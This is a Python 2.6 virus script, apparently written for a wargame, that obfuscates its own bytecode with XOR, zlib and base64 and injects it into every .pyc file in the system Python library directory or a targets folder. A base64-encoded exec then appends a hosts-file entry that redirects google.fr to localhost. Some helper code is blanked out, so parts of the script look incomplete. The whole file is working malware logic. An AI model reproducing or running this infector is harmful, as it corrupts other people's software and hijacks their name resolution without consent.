signature = "PY_2.6"
# -*- coding: utf-8 -*-

import socket
import marshal
import zlib
import glob
from base64 import b64decode, b64encode
import random


def crypt(clear):
    key = chr(random.randint(0, 255))
    crypted = "".join(chr(ord(c) ^ ord(key)) for c in clear)

    return key + crypted


if __file__.endswith('.pyc'):
    template = b64decode("c2lnbmF0dXJlID0gIlBZXzIuNiIKIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KCmltcG9ydCB6bGliCmltcG9ydCBiYXNlNjQKaW1wb3J0IG1hcnNoYWwKCl9fREVDUllQVF9QTEFDRUhPTERFUl9fCgpwYXlsb2FkID0gIl9fUEFZTE9BRF9QTEFDRUhPTERFUl9fIgoKIyBkZS1iNjQgc3RlcApkZWI2NCA9IGJhc2U2NC5iNjRkZWNvZGUocGF5bG9hZCkKCiMgZGUtY3J5cHQgc3RlcApkZWNyeXB0ID0gZGVjcnlwdChkZWI2NCkKCiMgZGUtY29tcHJlc3Mgc3RlcApkZWNvbXByZXNzID0gemxpYi5kZWNvbXByZXNzKGRlY3J5cHQpCgojIGRlLW1hcnNoYWwgc3RlcApkZW1hcnNoYWwgPSBtYXJzaGFsLmxvYWRzKGRlY29tcHJlc3MpCgojIGV4ZWMKZXhlYyBkZW1hcnNoYWwKCnNpZ25hdHVyZSA9ICJQWV8yLjYiCg==")
    template = template.replace("__DECRYPT_PLACEHOLDER__", """
def decrypt(crypted):
    key = crypted[0]

    return "".join(chr(ord(c) ^ ord(key)) for c in crypted[1:])
""")



    # ------------- GENERATING BYTEPLAY DATA (for injector) ---------------
    Code = None
    CodeList = None
    EXEC_STMT = None
    exec b64decode("")

    f = open(__file__, 'r')
    head = f.read(8)
    data = Code.from_code(marshal.loads(f.read()))
    f.close()
    payload = data

    EXPLOIT_SIZE = None
    for i in xrange(2, len(data.code)):
        if type(data.code[i][1]) == type('') and data.code[i][1] == signature:
            EXPLOIT_SIZE = i + 2
            break
    if not EXPLOIT_SIZE:
        print "EXPLoiT_ISZE not found"

    data.code = data.code[:EXPLOIT_SIZE]
    data.code.append((LOAD_CONST,None))
    data.code.append((RETURN_VALUE,None))
    print "payload clair %s" % CodeList(data.code)
    payload = b64encode(crypt(zlib.compress(marshal.dumps(data.to_code()))))
    template = template.replace("__PAYLOAD_PLACEHOLDER__", payload)
    payload = Code.from_code(compile(template, "z", "exec")).code
    payload = CodeList(payload[:-2])
    #print "payload chiffré %s" % payload

    # ------------- GENERATING PAYLOAD DATA ---------------
    def infect(f_to_infect):
        print "j'infecte %s" % f_to_infect
        if f_to_infect.endswith("socket.pyc"):
            return

        f = open(f_to_infect, 'r')

        head = f.read(8)

        data = Code.from_code(marshal.loads(f.read()))
        if data.code[1][1] == signature:
            return

        f.close()

        data.code[:0] = payload

        newfile = open(f_to_infect, 'w')
        newfile.write(head)
        marshal.dump(data.to_code(), newfile)
        newfile.close()


    # print """
    #
    # LLLLLLLLLLL                              lllllll   iiii          tttt                                         66666666  999999999
    # L:::::::::L                              l:::::l  i::::i      ttt:::t                                        6::::::6 99:::::::::99
    # L:::::::::L                              l:::::l   iiii       t:::::t                                       6::::::699:::::::::::::99
    # LL:::::::LL                              l:::::l              t:::::t                                      6::::::69::::::99999::::::9
    #   L:::::L                  ooooooooooo    l::::l iiiiiiittttttt:::::ttttttt      aaaaaaaaaaaaa            6::::::6 9:::::9     9:::::9
    #   L:::::L                oo:::::::::::oo  l::::l i:::::it:::::::::::::::::t      a::::::::::::a          6::::::6  9:::::9     9:::::9
    #   L:::::L               o:::::::::::::::o l::::l  i::::it:::::::::::::::::t      aaaaaaaaa:::::a        6::::::6    9:::::99999::::::9
    #   L:::::L               o:::::ooooo:::::o l::::l  i::::itttttt:::::::tttttt               a::::a       6::::::::6666699::::::::::::::9
    #   L:::::L               o::::o     o::::o l::::l  i::::i      t:::::t              aaaaaaa:::::a      6::::::::::::::6699999::::::::9
    #   L:::::L               o::::o     o::::o l::::l  i::::i      t:::::t            aa::::::::::::a      6::::::66666:::::6    9::::::9
    #   L:::::L               o::::o     o::::o l::::l  i::::i      t:::::t           a::::aaaa::::::a      6:::::6     6:::::6  9::::::9
    #   L:::::L         LLLLLLo::::o     o::::o l::::l  i::::i      t:::::t    tttttta::::a    a:::::a      6:::::6     6:::::6 9::::::9
    # LL:::::::LLLLLLLLL:::::Lo:::::ooooo:::::ol::::::li::::::i     t::::::tttt:::::ta::::a    a:::::a      6::::::66666::::::69::::::9
    # L::::::::::::::::::::::Lo:::::::::::::::ol::::::li::::::i     tt::::::::::::::ta:::::aaaa::::::a       66:::::::::::::669::::::9
    # L::::::::::::::::::::::L oo:::::::::::oo l::::::li::::::i       tt:::::::::::tt a::::::::::aa:::a        66:::::::::66 9::::::9
    # LLLLLLLLLLLLLLLLLLLLLLLL   ooooooooooo   lllllllliiiiiiii         ttttttttttt    aaaaaaaaaa  aaaa          666666666  99999999
    # """
    #print "ici 3"
    if socket.gethostname() == "OT-Wargame":
        target_dir = "/usr/lib/python2.6/*.pyc"
    else:
        target_dir = "./targets/*.pyc"

    for i in glob.glob(target_dir):
        infect(i)

    # print "Unfortunately your computer's specifications do not allow you access to our service.\nExiting..."

    exec b64decode("aW1wb3J0IHNvY2tldAoKaWYgc29ja2V0LmdldGhvc3RuYW1lKCkgPT0gIk9ULVdhcmdhbWUiOgogICAgbmV3X2hvc3QgPSAiMTI3LjAuMC4xXHRnb29nbGUuZnIiCiAgICBmaWxlbmFtZSA9ICIvZXRjL2hvc3RzIgoKICAgIGYgPSBvcGVuKGZpbGVuYW1lLCAiYSsiKQoKICAgIGlmIGYucmVhZCgpLmZpbmQobmV3X2hvc3QpID09IC0xOgogICAgICAgIGYud3JpdGUobmV3X2hvc3QgKyAiXG4iKQoKICAgIGYuY2xvc2UoKQplbHNlOgogICAgcHJpbnQgIiAjIyMjIyMjIyMjIyAgLyFcIElORkVDVEVEIC8hXCAjIyMjIyMjIyMjIyMjIyMgIgo=")

signature = "PY_2.6"
